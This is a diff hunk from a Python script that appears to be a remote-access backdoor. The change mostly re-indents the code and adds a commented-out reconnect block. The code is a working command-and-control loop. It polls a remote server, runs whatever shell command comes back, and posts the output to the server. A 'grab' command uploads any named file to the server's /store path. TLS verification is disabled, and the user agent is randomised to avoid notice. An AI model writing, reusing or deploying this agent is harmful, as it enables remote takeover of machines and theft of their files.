@@ -42,21 +42,28 @@ headers = {'User-Agent': choice(user_agents)}
 print("Connecting to ", httpsrv)
 
 while True:
-    req = requests.get(httpsrv, headers=headers, verify=False)
-    command = req.text
-    if 'terminate' in command:
-        break
-    elif 'grab' in command:
-        grab, path = command.split("*")
-        if os.path.exists(path):
-            url = httpsrv + '/store'
-            files = {'file': open(path, 'rb')}
-            r = requests.post(url, files=files, headers=headers, verify=False)
-        else:
-            post_response = requests.post(url=httpsrv, data='[-] Not able to find the file!'.encode(), verify=False)
-    else:
-        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        post_response = requests.post(url=httpsrv, data=CMD.stdout.read(), verify=False)
-        post_response = requests.post(url=httpsrv, data=CMD.stderr.read(), verify=False)
-    time.sleep(3)
+	req = requests.get(httpsrv, headers=headers, verify=False)
+	command = req.text
+	if 'terminate' in command:
+		break
+	elif 'grab' in command:
+		grab, path = command.split("*")
+		if os.path.exists(path):
+			url = httpsrv + '/store'
+			files = {'file': open(path, 'rb')}
+			r = requests.post(url, files=files, headers=headers, verify=False)
+		else:
+			post_response = requests.post(url=httpsrv, data='[-] Not able to find the file!'.encode(), verify=False)
+	else:
+		CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		post_response = requests.post(url=httpsrv, data=CMD.stdout.read(), verify=False)
+		post_response = requests.post(url=httpsrv, data=CMD.stderr.read(), verify=False)
+	time.sleep(3)
+"""
+	except Exception as ex:
+		print("Disconnect occurred")
+		time.sleep(5)
+		print("Reconnecting...")
+"""	
+
 
